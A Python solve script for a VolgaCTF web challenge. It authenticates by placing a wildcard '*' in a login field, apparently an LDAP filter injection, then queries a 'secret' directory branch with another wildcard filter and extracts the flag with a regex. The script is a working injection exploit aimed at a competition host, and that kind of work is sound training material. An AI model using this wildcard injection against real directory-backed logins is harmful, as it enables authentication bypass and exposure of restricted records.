#!/usr/bin/env python3

import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request


BASE_URL = "http://web-l1-1.q.2026.volgactf.ru:5001"
FLAG_RE = re.compile(r"VolgaCTF\{[^}]+\}")


def request_json(method, path, *, data=None, headers=None):
    url = urllib.parse.urljoin(BASE_URL, path)
    body = None
    req_headers = {"Accept": "application/json"}
    if headers:
        req_headers.update(headers)

    if data is not None:
        body = json.dumps(data).encode()
        req_headers["Content-Type"] = "application/json"

    req = urllib.request.Request(url, data=body, headers=req_headers, method=method)

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.getcode(), json.loads(resp.read().decode())
    except urllib.error.HTTPError as exc:
        payload = exc.read().decode()
        try:
            return exc.code, json.loads(payload)
        except json.JSONDecodeError:
            return exc.code, {"raw": payload}


def authenticate():
    creds = {
        "username": "jdoe",
        "email": "jdoe@volgactf.ru",
        "telephone": "*",
    }
    status, data = request_json("POST", "/auth", data=creds)
    if status != 200 or "token" not in data:
        raise RuntimeError(f"auth failed: HTTP {status} -> {data}")
    return data["token"]


def fetch_secret_branch(token):
    query = urllib.parse.urlencode({"ou": "secret", "telephoneNumber": "*"})
    headers = {"Authorization": f"Bearer {token}"}
    status, data = request_json("GET", f"/directory?{query}", headers=headers)
    if status != 200 or "users" not in data:
        raise RuntimeError(f"directory lookup failed: HTTP {status} -> {data}")
    return data["users"]


def extract_flag(users):
    for user in users:
        for value in user.values():
            if not isinstance(value, str):
                continue
            match = FLAG_RE.search(value)
            if match:
                return match.group(0)
    raise RuntimeError("flag not found in returned directory entries")


def main():
    token = authenticate()
    users = fetch_secret_branch(token)
    flag = extract_flag(users)

    print("[+] JWT acquired")
    print(f"[+] Secret branch entries: {len(users)}")
    print(flag)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        sys.exit(1)
